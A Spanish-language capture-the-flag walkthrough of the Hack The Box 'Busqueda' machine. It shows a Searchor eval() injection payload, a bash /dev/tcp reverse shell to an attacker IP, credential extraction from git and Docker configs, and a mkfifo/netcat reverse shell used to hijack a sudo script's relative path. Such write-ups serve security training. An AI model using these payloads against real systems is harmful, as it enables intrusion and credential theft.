# Busqueda

![](../../../../~gitbook/image.md)Publicado: 04 de Mayo de 2025
Autor: José Miguel Romero aka x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Esta máquina Linux explota una vulnerabilidad de ejecución de código arbitrario en la biblioteca Python Searchor para obtener acceso inicial. Posteriormente, se escalan privilegios aprovechando permisos sudo en un script de Python sin la adecuada sanitización.
###🚀 Metodología

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios
⚠️ Importante: El servicio HTTP redirige a `searcher.htb`. Debemos agregar este dominio a nuestro archivo hosts.
###🌐 Enumeración Web
Al acceder a la web, descubrimos un motor de búsqueda unificado que genera URLs de consulta para varios motores de búsqueda.![](../../../../~gitbook/image.md)Realizando fuzzing de vhosts descrubirmos un vhost llamado gitea que añadimos también a nuestro fichero /etc/hosts![](../../../../~gitbook/image.md)
####Hallazgo clave
En el pie de página, se revela que la aplicación usa Searchor v2.4.0. Una investigación rápida muestra que esta versión es vulnerable a ejecución de código arbitrario y un exploit público:https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection![](../../../../~gitbook/image.md)El problema radica en el uso inseguro de la función `eval()` de Python.
###💉 Explotación

####Payload para prueba de concepto

####Reverse Shell
Descargamos el exploitLe concedemos permisos de ejecuciónIniciamos un listener en nuestro host de ataqueEjecutamos el exploit indicando la URL del objetivo y nuestra IP y puerto del host de ataque para ganar acceso al objetivo:![](../../../../~gitbook/image.md)Esto mismo se podría hacer también usando el siguiente payload interceptando la petición con la herramienta Burp Suite:¡Éxito! Hemos obtenido acceso al sistema como usuario `svc`.
####Flag de Usuario

###🔐 Escalada de Privilegios

####Descubrimiento de credenciales
En el directorio `/var/www/app`, encontramos un repositorio Git:Examinando la configuración de Git, descubrimos credenciales:🔑 Credenciales descubiertas: `cody:jh1usoih2bkjaspwe92`Verificamos que se está haciendo de una mala práctica de re-utilización de contraseñas y el usuario svc también usa esta contraseña, por lo que podemos ganar acceso a la máquina a través del puerto ssh con el usuario svc y de esta forma ganar persistencia.
####Permisos sudo
Comprobamos los permisos sudo del usuario `svc`:
####Análisis del script vulnerable
Descubrimos que el usuario svc no tiene permisos de escritura ni lectura pero podemos ejecutar `system-checkup.py` como root:![](../../../../~gitbook/image.md)Uso del parámetro docker-ps del script `system-checkup.py`![](../../../../~gitbook/image.md)Uso del parámetro docker-inspect del script `system-checkup.py`![](../../../../~gitbook/image.md)Podemos obtener más información sobre el parámetro `<format>`en la siguiente documentación de dockerhttps://docs.docker.com/reference/cli/docker/inspect/Podemos utilizar {{json .}} como el argumento de formato requerido por el argumento docker-inspect del script.Para leer la salida JSON convenientemente, podemos utilizar jq para analizar la salida JSON en un formato legible. jq
puede ser instalado utilizando el siguiente comando, sin embargo, ya está presente en la máquina de destino.Ejecutamos el script con los parámetros adecuados sobre el conteendor de gitea:🔑 Credenciales descubiertas: `yuiu1hoiu4i5ho1uh`Esta contraseña nos permite autenticarnos en el vhost http://gitea.searcher.htb como usuario Administrator y acceder al repositorio de script, pudiendo de esta forma analizar su contenido:![](../../../../~gitbook/image.md)Al revisar el script comprobamos que si pasamos como argumento la opción "full-checkup" ejecuta el script ./full-checkup.sh:![](../../../../~gitbook/image.md)
####Explotación del script
Aprovechamos la referencia relativa a full-checkup.sh ejecutando el script system-checkup desde otro directorio que contendrá nuestro propio script malicioso full-checkup.sh.Creamos una reverse shell con el siguiente contenido:Lo hacemos ejecutableIniciamos un listener en el puerto 9001Por útimo, lanzamos de nuevo el script desde el directorio /tmp para que abusando de la ruta relativa se ejecute el script full-checkup.sh malicioso con nuestra reverse shell:![](../../../../~gitbook/image.md)
####Flag de root
Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💉 Explotación](#explotacion)
- [🔐 Escalada de Privilegios](#escalada-de-privilegios)

```
10.10.11.208 - searcher.htb
```

```
❯ ping -c 1 10.10.11.208
PING 10.10.11.208 (10.10.11.208) 56(84) bytes of data.
64 bytes from 10.10.11.208: icmp_seq=1 ttl=63 time=110 ms

--- 10.10.11.208 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.839/109.839/109.839/0.000 ms
```

```

ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.208 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)

nmap -sC -sV -p$ports 10.10.11.208

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 20:44 -05
Nmap scan report for 10.10.11.208
Host is up (0.12s latency).
Not shown: 65464 closed tcp ports (reset), 69 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.96 seconds
```

```
❯ nmap -p 22,80 -sV -sC --min-rate 2000 10.10.11.208 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 20:45 -05
Nmap scan report for 10.10.11.208
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://searcher.htb -H 'Host:FUZZ.searcher.htb' -fc 302
```

```
echo "10.10.11.208 gitea.searcher.htb" | sudo tee -a /etc/hosts
```

```
'),__import__('os').system('id')#
```

```
wget https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/refs/heads/main/exploit.sh
```

```
chmod +x exploit.sh
```

```
nc -nlvp 1234
```

```
./exploit.sh http://searcher.htb 10.10.14.8 1234
```

```
'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.41/9001 0>&1"')#
```

```
❯ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.208] 47898
bash: cannot set terminal process group (1641): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
svc
```

```
svc@busqueda:~$ cat user.txt
4a7480a3b6c75f12****************
```

```
svc@busqueda:/var/www/app$ ls -al
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Jun 22 01:43 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

```
svc@busqueda:/var/www/app/.git$ cat config
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
[remote "origin"]
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
remote = origin
merge = refs/heads/main
```

```
ssh svc@10.10.11.208
```

```
svc@busqueda:~$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py  (arg1) (arg2)

docker-ps     : List running docker containers
docker-inspect : Inpect a certain docker container
full-checkup  : Run a full system checkup
```

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
```

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```

```

"Tty": false,
"OpenStdin": false,
"StdinOnce": false,
"Env": [
"USER_UID=115",
"USER_GID=121",
"GITEA__database__DB_TYPE=mysql",
"GITEA__database__HOST=db:3306",
"GITEA__database__NAME=gitea",
"GITEA__database__USER=gitea",
"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
"USER=git",
"GITEA_CUSTOM=/data/gitea"
],

```

```
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  9001 >/tmp/f" > /tmp/full-checkup.sh
```

```
chmod +x /tmp/full-checkup.sh
```

```
nc -nlvp 9001
```

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

```
root@busqueda:~# cat root.txt
```
